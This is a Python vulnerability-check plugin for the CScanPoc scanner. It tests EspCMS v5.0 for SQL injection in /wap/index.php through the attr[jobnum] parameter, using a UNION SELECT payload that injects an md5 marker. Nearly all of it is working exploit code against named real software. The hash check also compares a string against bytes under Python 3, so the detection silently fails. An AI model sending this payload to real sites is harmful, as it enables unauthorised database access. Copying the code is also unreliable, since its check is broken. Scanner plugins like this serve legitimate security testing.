# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.error
import urllib.parse


class Vuln(ABVuln):
    vuln_id = 'EspCMS_0013'  # 平台漏洞编号，留空
    name = '易思CMS v5.0 /wap/index.php SQL注入漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2013-06-25'  # 漏洞公布时间
    desc = '''
        EspCMS(易思CMS) v5.0 /wap/index.php，attr[jobnum]造成了注入。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'EspCMS(易思CMS)'  # 漏洞应用名称
    product_version = 'v5.0'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'e1e70f1a-89a2-4cca-b842-fd3de9cc87a7'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-07'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = ("/wap/index.php?ac=search&at=result&lng=cn&mid=3&tid=11&keyword=1&keyname="
                       "a.title&countnum=1&attr%5Bjobnum%5D=1%27%20and%201=2%20UNION%20SELECT%201,2,"
                       "3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,concat%28md5%283"
                       ".1415%29%29,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45;%23")
            verify_url = self.target + payload
            req = urllib.request.Request(verify_url)
            content = urllib.request.urlopen(req).read()

            if "63e1f04640e83605c1d177544a5a0488" in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
